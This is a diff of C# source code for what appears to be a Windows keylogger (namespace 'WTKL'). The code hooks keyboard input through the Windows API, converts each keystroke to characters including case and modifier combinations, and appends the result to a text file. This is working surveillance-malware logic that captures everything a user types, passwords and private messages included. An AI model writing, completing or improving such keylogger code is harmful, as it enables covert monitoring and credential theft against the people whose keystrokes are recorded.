@@ -295,43 +295,11 @@ namespace WTKL
                 GetKeyboardState(keyboardArray);
 
                 //Logical OR the left and right keys with the regular key
-                keyboardArray[VK_SHIFT] = (byte)(keyboardArray[VK_SHIFT] | keyboardArray[VK_LEFT_SHIFT] |
+                /*keyboardArray[VK_SHIFT] = (byte)(keyboardArray[VK_SHIFT] | keyboardArray[VK_LEFT_SHIFT] |
                     keyboardArray[VK_RIGHT_SHIFT]);
 
                 keyboardArray[VK_CONTROL] = (byte)(keyboardArray[VK_CONTROL] | keyboardArray[VK_LEFT_CONTROL] |
-                    keyboardArray[VK_RIGHT_CONTROL]);
-
-                /*for (int i = 0; i < keyboardArray.Length; i++)
-                {
-                    if ((keyboardArray[i] & 0x80) != 0)
-                    {
-                        /*if (lParam.vkCode == i)
-                        {
-                            output = output + " + " + keyStrings[i];
-                        }*//*
-                        if (firstKey)
-                        {
-                            output += keyStrings[i];
-                            firstKey = false;
-                        }
-                        else
-                        {
-                            output += " + " + keyStrings[i];
-                        }
-                    }
-                    if(lParam.vkCode == i)
-                    {
-                        if (firstKey)
-                        {
-                            output += keyStrings[i];
-                            firstKey = false;
-                        }
-                        else
-                        {
-                            output += " + " + keyStrings[i];
-                        }
-                    }
-                }*/
+                    keyboardArray[VK_RIGHT_CONTROL]);*/
 
                 //If keycode is between a and z
                 if (lParam.vkCode >= 65 && lParam.vkCode <= 90)
@@ -339,8 +307,10 @@ namespace WTKL
                     byte[] asciiConvertBuffer = new byte[2];
                     if (ToAscii(lParam.vkCode, lParam.scanCode, keyboardArray, asciiConvertBuffer, lParam.flags) == 1)
                     {
-                        char key = (char)asciiConvertBuffer[0];   
-                        if ((keyboardArray[VK_SHIFT] & 0x80) != 0 ^ (keyboardArray[VK_CAPS] & 0x01) != 0)
+                        char key = (char)asciiConvertBuffer[0];
+                        //checks if any shift key is pressed and compares it to capslock to determine case
+                        if (((keyboardArray[VK_SHIFT] | keyboardArray[VK_LEFT_SHIFT] |
+                            keyboardArray[VK_RIGHT_SHIFT]) & 0x80) != 0 ^ (keyboardArray[VK_CAPS] & 0x01) != 0)
                         {
                             key = Char.ToUpper(key);
                         }
@@ -437,9 +407,25 @@ namespace WTKL
                     output = " ";
                 }
 
-                else if (true) //todo modifier keys
+                else // modifier keys
                 {
-
+                    output = getModifiers(lParam.vkCode, false);
+                    if (output.Length > 0)
+                    {
+                        string temp;
+                        for (int i = 0; i < keyboardArray.Length; i++)
+                        {
+                            if ((keyboardArray[i] & 0x80) != 0 && i != lParam.vkCode)
+                            {
+                                temp = getModifiers(i, true);
+                                if (temp.Length > 0)
+                                {
+                                    output += " + " + temp;
+                                }
+                            }
+                        }
+                        output = "[" + output + "]";
+                    }
                 }
 
                 textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
@@ -450,6 +436,102 @@ namespace WTKL
             {
             }
             return CallNextHookEx(_hookID, nCode, wParam, ref lParam);
+        }
+
+        private static string getModifiers(int keycode, bool includeShift)
+        {
+            string keyStr = "";
+            switch (keycode)
+            {
+                case VK_BACKSPACE:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_TAB:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_ENTER:
+                    keyStr = keyStrings[keycode];
+                    break;
+                /*case VK_CONTROL:
+                    keyStr = keyStrings[VK_CONTROL];
+                    break;*/
+                case VK_LEFT_CONTROL:
+                    keyStr = keyStrings[VK_CONTROL];
+                    break;
+                case VK_RIGHT_CONTROL:
+                    keyStr = keyStrings[VK_CONTROL];
+                    break;
+                case VK_ALT:
+                    keyStr = keyStrings[keycode];
+                    break;
+                /*case VK_LEFT_MENU:
+                    keyStr = keyStrings[VK_ALT];
+                    break;
+                case VK_RIGHT_MENU:
+                    keyStr = keyStrings[VK_ALT];
+                    break;*/
+                case VK_CAPS:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_ESC:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_PAGE_UP:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_PAGE_DOWN:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_END:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_HOME:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_ARROW_DOWN:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_ARROW_LEFT:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_ARROW_RIGHT:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_ARROW_UP:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_PRINT_SCREEN:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_INSERT:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_DELETE:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_LWINDOWS:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_RWINDOWS:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_NUMLOCK:
+                    keyStr = keyStrings[keycode];
+                    break;
+                case VK_SCROLL_LOCK:
+                    keyStr = keyStrings[keycode];
+                    break;
+                default:
+                    if (includeShift)
+                    {
+                        if (keycode == VK_SHIFT || keycode == VK_RIGHT_SHIFT || keycode == VK_LEFT_SHIFT)
+                        {
+                            keyStr = keyStrings[VK_SHIFT];
+                        }
+                    }
+                    break;
+            }
+            return keyStr;
         }
 
         /* This method is used to set our application's hook into the Windows keyboard
